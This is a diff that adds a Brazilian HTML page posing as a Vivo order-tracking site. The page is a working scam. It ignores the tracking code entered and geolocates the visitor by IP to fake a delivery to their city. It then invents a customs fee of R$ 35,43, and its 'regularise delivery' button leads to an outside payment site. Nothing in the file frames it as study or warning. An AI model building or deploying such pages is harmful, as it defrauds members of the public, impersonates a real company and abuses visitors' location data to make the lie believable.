@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Rastrear Pedido - Vivo</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      background: #f9f9f9;
+      color: #333;
+    }
+    header {
+      background-color: #670099;
+      text-align: center;
+      padding: 20px;
+    }
+    header img {
+      max-width: 130px;
+    }
+    .container {
+      max-width: 600px;
+      margin: 40px auto;
+      background: #fff;
+      padding: 30px;
+      border-radius: 8px;
+      text-align: center;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    .btn {
+      background: #670099;
+      color: #fff;
+      padding: 12px;
+      border: none;
+      border-radius: 5px;
+      width: 100%;
+      font-size: 16px;
+      cursor: pointer;
+      box-sizing: border-box;
+    }
+    .result {
+      margin-top: 20px;
+      font-size: 15px;
+    }
+    .icon {
+      width: 20px;
+      vertical-align: middle;
+      margin-right: 6px;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <img src="https://www.commshop.com.br/vivo-fibra/assets/apps/Vivo-roxo.png" alt="Logo Vivo">
+  </header>
+
+  <div class="container">
+    <h2>Rastrear Pedido</h2>
+    <input type="text" id="codigo" placeholder="Digite o código de rastreio" />
+    <button class="btn" onclick="consultar()">Consultar</button>
+    <div class="result" id="resultado"></div>
+  </div>
+
+  <script>
+    function consultar() {
+  fetch('https://ipwho.is/')
+  .then(res => res.json())
+  .then(data => {
+    const cidade = data.city;
+
+    document.getElementById("resultado").innerHTML = `
+      <div style='text-align:center'>
+        <p><img src='https://cdn-icons-png.flaticon.com/512/2991/2991108.png' class='icon'/> Origem: Barretos - SP</p>
+        <p><img src='https://cdn-icons-png.flaticon.com/512/1584/1584911.png' class='icon'/> Status: Produto a caminho</p>
+        <p><img src='https://cdn-icons-png.flaticon.com/512/535/535137.png' class='icon'/> Destino: ${cidade}</p>
+        <br>
+        <p><img src='https://cdn-icons-png.flaticon.com/512/595/595067.png' class='icon'/> Pendência identificada: Sua encomenda foi taxada pela Alfândega.</p>
+        <p><strong>Taxa obrigatória: R$ 35,43</strong></p>
+        <br>
+        <a href="https://www.seguropagamentos.com.br/treinamento"><button class="btn">REGULARIZAR ENTREGA</button></a>
+      </div>
+    `;
+  });
+
+}
+
+  </script>
+</body>
+</html>
